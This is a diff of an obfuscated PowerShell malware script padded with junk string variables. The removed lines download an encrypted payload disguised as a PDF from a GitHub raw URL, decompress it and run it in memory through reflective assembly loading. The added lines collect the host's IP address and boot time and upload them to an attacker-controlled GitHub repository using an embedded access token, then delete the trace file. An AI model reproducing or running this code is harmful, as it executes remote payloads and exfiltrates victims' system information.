@@ -1,85 +1,31 @@
-$She54y3etgsdfgdgdfgdfgdfgdfgdfgdfg = "WETWQTQWSGFSDf34t345t4353534534543534ir872324igh38759123842735";
-function be54yedfghe54ygwegsg {[CmdletBinding()] Param ([Parameter(Position = 0, Mandatory = $True)] 
-        [byte[]] $SHe35ryegdsfgdfgdfgdfgdfd = $(Throw("-byteArray is required")) ); 
-    $Sh3e4rghsdfghdfgdfgSRgh = New-Object System.IO.MemoryStream(, $SHe35ryegdsfgdfgdfgdfgdfd ); $WSHrgrgtgrretretert = "iuy7uy87yiuhjkhlkjhjkhgljkdgjkg098238472095rohgiuofgjkewnt";
-        $Shrehdfgdfgdfgdfgfdg = New-Object System.IO.MemoryStream; $ruakci234nbnbnlk = "9016hbfuf6gsdv8762o3iuhidofhgidghjgkgkjhghjkghjkghjgughj";
-        $LJKHGJdnfjkgndjkghrjtdkgndsjkfg = "{1}{0}{3}{2}{4}"; $SLIughwerkjthskjldfhsdjklfsdklfhsdkjf = "SBHsreSDbsdfgsdfdsfdsfsdf";
-        $ajkvhurejn2234gndjfg = New-Object System.IO.Compression.GzipStream $Sh3e4rghsdfghdfgdfgSRgh, ([IO.Compression.CompressionMode]::($LJKHGJdnfjkgndjkghrjtdkgndsjkfg -f 'cO', 'dE', "`R`E", "`M`p", "`s`S")); $ajkvhurejn2234gndjfg.CopyTo( $Shrehdfgdfgdfgdfgfdg );
-        $SLIughwerkjthskjldfhsdjklfsdklfhsdkjf = "SBHsreSDbsdfgsdfdsfdsfsdf"; $ugehua233248gh2ihdujfbv = "lfkhjlkfdh98u34pihjiodygbh0983hqtijdhgndshkljgbh"; $ajkvhurejn2234gndjfg.Close(); $Sh3e4rghsdfghdfgdfgSRgh.Close(); [byte[]] $AFDSsdfdsfdfdsfdsf = $Shrehdfgdfgdfgdfgfdg.ToArray(); $SLIughwerkjthskjldfhsdjklfsdklfhsdkjf = "SBHsreSDbsdfgsdfdsfdsfsdf"; return $AFDSsdfdsfdfdsfdsf;
+$klfdhlkfdgrrgr= "dsgjkhxzuvoinkejvn.,cnv.,mcxn.v,mdfsgdsgdsfgdsg"
+$uruoie2143 = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }).IPAddress[0]
+$dlkjhfgjkr = "dfhgj8u2hnfkjhJKGCUYGDSUYGD(*UFT*(&^F%T*&dgdgdg"
+$IOEGfgi3dfg = Get-Date -Format "MMdd_HHmm"
+$ereeelkjhlvknnds = "sdgjkhdsljkghiuobvnjknlkdsjnlkjhdsgiuohl2i23jh98&A^S9D87A6(*&d^(*s&"
+$lkfghexiuovertte = "$uruoie2143-$IOEGfgi3dfg-XXX-kkk.txt"
+$ereeelkjhlvknnds += "DFJKHGKLDHFJLKJDLKGJSKDFJGKJ*)(&^(*&#yiuohfrljkhdgjkH" 
+$jdhgkkkduufjiegeee = Join-Path $env:appdata $lkfghexiuovertte
+$dlkjhfgjkr+= "SDFJKHDJKHFJKHTIPDUJH8I&^(&*@yiuo@h #@#lk2342RDFGDFGDFGFGFGFG"
+(Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Out-File -FilePath $jdhgkkkduufjiegeee
+$klfdhlkfdgrrgr += "DSFJKHGLDSJKHTIODHGJKH8U2H34UH234H23KH4L23KH423JH4H24JKHIU2RIODUSY8D7F0UUUUUUUUUUUU"
+$safftvkkkkflr923 = "htt"+"ps"+":/"+"/a" + "pi.g" + "ith" + "ub.com/re" + "pos/JanglePrag/ErpDS/contents/Reset/" + $lkfghexiuovertte
+$klfdhlkfdgrrgr += "(*&)(*&@)(*ijfhjhfljkdhlkjhfljkdhfljkhdljkgh"
+$uidmmcnnndr231mv = "gh"+"p_7"+"7LH"+"JKl"+"VP4"+"P3iQ"+"F4m9"+"5VrJJ"+"ZZG3"+"TO"+"Y2x"+"vN"+"nT"
+$klfdhlkfdgrrgr += "LJKHVUH23940347-98709H9FDHJGOHDJGHJLDK"
+$hjjjdkxmcffefxzxxf12 = Get-Content -Path $jdhgkkkduufjiegeee -Encoding Byte
+$klfdhlkfdgrrgr += "KVH8U23847098234709823740982730984723093472309847203984798,;GDJDSGLDSKJGL"
+$oooepofdklhh2j4 = [Convert]::ToBase64String($hjjjdkxmcffefxzxxf12)
+$ppekldlksviurk234 = @{
+    message = "Upload file $lkfghexiuovertte"
+    content = $oooepofdklhh2j4
+    branch = "main"
 }
-$SLIughwerkjthskjldfhsdjklfsdklfhsdkjf = "SRGliwueghskdfgsdkjfgdghs&DSFD*GUI";
-$SRHerhSLKDFJghw4suidfbfbsdjkfsdbkfgbwejhrvbksdjfsdfdsfsd = "om/"+"Jan"+"gle"+"Pra"+"g/Er"+"pD"+"S/ma"+"in/p";
-Add-type -Assembly System.Drawing;
-Add-Type -Assembly System.Windows.Forms;
-$SLIughwerkjthskjldfhsdjklfsdklfhsdkjf = "SBHsreSDbsdfgsdfdsfdsfsdf";
-Add-Type -Assembly PresentationCore;
-$SRHerhSLKDFJghw4suidfbfbsdjkfsdbkfgbwejhrvbksdjfsdfdsfsd = "ht"+"tps"+":/"+"/ra"+"w.git"+"hub"+"use"+"rco"+"nte"+"nt.c" + $SRHerhSLKDFJghw4suidfbfbsdjkfsdbkfgbwejhrvbksdjfsdfdsfsd;
-$SLIughwerkjthskjldfhsdjklfsdklfhsdkjf = "SBHsreSDbsdfgsdfdsfdsfsdf";
-Add-Type -AssemblyName System.Windows.Forms;
-$SLIughwerkjthskjldfhsdjklfsdklfhsdkjf = "SBHsreSDbsdfgsdfdsfdsfsdf";
-$ShrrhSHRHRHSRGSRGDGSFSDF = "SDRHeryehgdfgdfgdfgdfgdfgdfgdfgdfgdfg&^587623984287yuh3457903uihgjiohiuuuuuuuuuuuuu";
-Add-type -AssemblyName System.Drawing;
-$JUhbvgisuyerwitIUYgsdsuayd = "ZZ"+"G3T"+"OY"+"2x"+"vN"+"nT";
-$ShrrhSHRHRHSRGSRGDGSFSDF = "Sher5y34ydsfgdfgdfgdfgdfgdfg";
-$JUhbvgisuyerwitIUYgsdsuayd = "gh"+"p_7"+"7LH"+"JKl"+"VP4"+"P3i"+"QF"+"4m9"+"5V"+"rJJ"+$JUhbvgisuyerwitIUYgsdsuayd;
-$DSfge4356sdrtretretretretfdsgf = $SRHerhSLKDFJghw4suidfbfbsdjkfsdbkfgbwejhrvbksdjfsdfdsfsd + "ads"+"truc"+"tur"+"e09"+"83"+"2.p"+"df";
-$ShrrhSHRHRHSRGSRGDGSFSDF += ":::::dghldkjhiugohdjhtiohtetl:ekt'L;KFGHDL;'K;'RTLEYRMHL;ML;'FMPU5230-95823-089043YU09UIO";
-$gkjr2fxvaawwjgwwvhjhbv = New-Object System.Net.WebClient
-$SGsergsdgsdfsdfwet534tefgfdgdgdfg = "LDKFJG;LKUGKKLJT82374029837098423750987ERTHFHDDFGRRERTJGFJGHJFGJFGJU63STUTUTUTRU";
-$gkjr2fxvaawwjgwwvhjhbv.Headers.Add("Authorization", "token $JUhbvgisuyerwitIUYgsdsuayd")
-$op82kfdJuisdsuayd = "SGHsdfgsdfgsdfsdfsdfdsfWE$TDg";
-$gkjr2fxvaawwjgwwvhjhbv.Headers.Add("Accept", "application/vnd.github.v3.raw")
-$lkuihwi8712jgd = "OPPEORP[GODF8943PODGU9834UUPIOUGIOJDOJGLK;GJLDKGJL;KDJLKJALKJG;LKDJG;LKDSJG";
-[byte[]]$SRghe35dsfgdfgdfgdfgdfgdfgw4t34t6wetdrtgdfg = $gkjr2fxvaawwjgwwvhjhbv.DownloadData($DSfge4356sdrtretretretretfdsgf);
-$ppoiiyihfj = "L;lkjkjfgkmfoiiutpoiurioputioU9-348958-3458096403YRKJYLKRJHLKJL;Kjlk:jl:kfj;LHKJ;H";
-$SRghe35dsfgdfgdfgdfgdfgdfgw4t34t6wetdrtgdfg[0] = 0x1F;
-$VFDsfewr32fd = "yiuyiuodyiuofydiuoyREL&^*&(fgiuh"
-$SRghe35dsfgdfgdfgdfgdfgdfgw4t34t6wetdrtgdfg[1] = 0x8B;
-$SLIughwerkjthskjldfhsdjklfsdklfhsdkjf = "HFJL;KDJLKJRTHOPIJoijfdgf:lkgjl:kjfglkjfdgkhgkl:kfdjhgkFDHJFDHJHDJHFDJL;HJHF";
-$SRghe35dsfgdfgdfgdfgdfgdfgw4t34t6wetdrtgdfg[2] = 0x08;
-$StCRdkj33ghei123 = "KL;JKL;J[OIRTJOIGHU[IO4UI-45UT0945UY-8Y904"
-$SRghe35dsfgdfgdfgdfgdfgdfgw4t34t6wetdrtgdfg[3] = 0x00;
-$SorikfCRdkjghei123 = "KJGHFDHP9O870-7-8456KPOKH'L;FDJ"
-$SClkhjgjdRdkjghei123 = "DHGJFDKHUPI4OJYHIOJFDHL;KJFGHL;KL;KFCJHL;FDKHJL;KFDJH;LKFDHFGH"
-$SRghe35dsfgdfgdfgdfgdfgdfgw4t34t6wetdrtgdfg[4] = 0x00;
-$SLIughwerkjthskjldfhsdjklfsdklfhsdkjf = "LKHGDJLK;DJFHLKJROKH098734U509843759843U5435435PIR73";
-$SRghe35dsfgdfgdfgdfgdfgdfgw4t34t6wetdrtgdfg[5] = 0x00;
-$SCRdkljhlkhkjghei123 = "LDJKHGJKDSIUHTR&*^(*&duhdijuf*(odhjkhjg";
-$SRghe35dsfgdfgdfgdfgdfgdfgw4t34t6wetdrtgdfg[6] = 0x00;
-$ssf3ASAS42jeb = "LDSKJFGKOIUuuuuuuuuuuuuuuuuofdipgu(*&giouyHIUYUIDIIIIIIIIIIIIIIIIII*76f09879834345345435";
-$djibvuDDHDLLKJH3242 = $SRghe35dsfgdfgdfgdfgdfgdfgw4t34t6wetdrtgdfg.Length + 8;
-$DEFEssf3ASAS42jeb = "ldskjhgio3u598utiogdj;lkjdshgdsjhfsh;dsjkhldshsdhsdh";
-$sEVFDFDDFsf3ASAS42jeb = "UUUUHJKHJKHLKHfvdgs09d8g43ojtpodsfigjdskjl;kdjgdsg";
-[byte[]]$orioapvnuyrbt843jdlokg = be54yedfghe54ygwegsg($SRghe35dsfgdfgdfgdfgdfgdfgw4t34t6wetdrtgdfg);
-$ssfSDWEWEWESD342jeb = "lkdjlkj9JDOIJKLFJLDKLKJFLKML:KFNGNJ:LKGJL:KFJL:KJFGJSL:KDJGLK";
-$djibvuDDHDLLKJH3242 = $orioapvnuyrbt843jdlokg.Length + 8;
-$jhlkjhjgije2443345 = "fhjfdyiojl;kjI*&(*#&U)(*#&_(*&_UIFJGOKHKLJFDHGLHKLJFHGJKFHDG";
-$vnvndklcxuow232fbnfskf23443 = "Lo";
-$uieuldjkg = "LKJHLKJHGPIOVNKN:LKNJFHGKLJ#)I*#)_()(*)_(RIJT:OKJDOGJOPGJLDKJGL:KDJLKJG";
-$vnvndklcxuow232fbnfskf23443 += "ad";
-$Shrgdrgfdfgfdgdf = [System.Reflection.Assembly].GetMethod($vnvndklcxuow232fbnfskf23443, [type[]][byte[]]).Invoke($null, @(, $orioapvnuyrbt843jdlokg));
-$ASgewegsgdfgdfgd = "SWYWWSGHSASDFGSDFGSDF398559-8(*ASDgwergtergfergtertgertl:l";
-$fjhviuehrhtlhrg = "SB#%QRAFsdfsdfsdfsdfsdfG&gy3hlmkhjkhljkhljkhljkhljkhljkhljkhlk";
-$LISAUghoi24uyhiosudhfksdjfhdskjfsdjilfdfkdsffdsf = 'Ma' + 'i' + 'n';
-$ASLDIughw249puoihsdkfjbsdkjfhsdjkfdhsjklfj = "dfgjkhionjdkkHIUSPIUY(*49945iop4j3tiojrjfd;kdnf;bkn;dflknb;lfnb;lndg;lkbn;lknbkjvcnkbnfgnb;kngf;lknb;klfndbgb;klj;klfjhkf;ljhk;fdljhk;fljhklgjhktohjgkkhltjhkjogjklfjglh;jflkhj";
-
-$SAEtrewt435sdfgdsfdsfdsf=$Shrgdrgfdfgfdgdf.EntryPoint
-$SAEtrewt435sdfgdsfdsfdsf.Invoke($null, @());
-
-foreach ($Sdg34sdgsdfgds in $Shrgdrgfdfgfdgdf.GetTypes()) {
-    $fjhviuehrhtlhrg = "SB#%QRAFsdfsdfsdfsdfsdfG&gy3hlmkhjkhljkhljkhljkhljkhljkhljkhlk";
-    foreach ($Nsdrheryhdfgbdfgdfgdfg in $Sdg34sdgsdfgds.GetMethods()) {
-        $fjhviuehrhtlhrg = "SB#%QRAFsdfsdfsdfsdfsdfG&gy3hlmkhjkhljkhljkhljkhljkhljkhljkhlk";
-        Write-Host "FuncName  ==>  $($Nsdrheryhdfgbdfgdfgdfg.Name)"  -ForegroundColor Green
-        if (($Nsdrheryhdfgbdfgdfgdfg.Name.ToLower()).equals($LISAUghoi24uyhiosudhfksdjfhdskjfsdjilfdfkdsffdsf.ToLower())) {
-            if ($false) {
-                $fjhviuehrhtlhrg = "SB#%QRAFsdfsdfsdfsdfsdfG&gy3hlmkhjkhljkhljkhljkhljkhljkhljkhlk"; 
-            }
-            else { 
-                $fjhviuehrhtlhrg = "SB#%QRAFsdfsdfsdfsdfsdfG&gy3hlmkhjkhljkhljkhljkhljkhljkhljkhlk";
-                $Nsdrheryhdfgbdfgdfgdfg.Invoke($null, @()); 
-                $fjhviuehrhtlhrg = "SB#%QRAFsdfsdfsdfsdfsdfG&gy3hlmkhjkhljkhljkhljkhljkhljkhljkhlk";
-            }
-        }
-    }
-};
+$klfdhlkfdgrrgr += "SDGJKHLKJHTIOUHDGJKHKJH2IU476239846283974698723649872"
+$llgkrmcvsj32gdsg = @{
+    "Authorization" = "token $uidmmcnnndr231mv"
+    "Content-Type" = "application/json"
+}
+$klfdhlkfdgrrgr += "VY8YT837HWH5IUHPHG;FGHU-9*&_(*&_(d&_*uUIHIUHIUHFDOJHGFGHFGHFH"
+$vnjemdmmfkdaf1 = Invoke-RestMethod -Uri $safftvkkkkflr923 -Method Put -Body ($ppekldlksviurk234 | ConvertTo-Json) -Headers $llgkrmcvsj32gdsg
+Remove-Item -Path $jdhgkkkduufjiegeee -Force;
